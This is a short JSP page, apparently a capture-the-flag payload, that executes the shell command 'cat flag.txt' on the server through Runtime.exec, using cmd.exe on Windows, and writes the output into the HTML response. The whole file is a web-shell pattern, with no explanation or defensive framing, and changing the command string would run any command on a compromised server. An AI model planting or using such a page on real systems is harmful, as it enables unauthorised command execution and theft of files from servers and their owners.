<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML>
    <BODY>
        <pre>
        <%
            String command = "cat flag.txt";
            out.println("Command: " + command + "<BR>");
            Process p;
            if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
                p = Runtime.getRuntime().exec("cmd.exe /C " + command);
            }
            else{
                p = Runtime.getRuntime().exec(command);
            }
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
            }
        %>
    </pre>
    </BODY>
</HTML>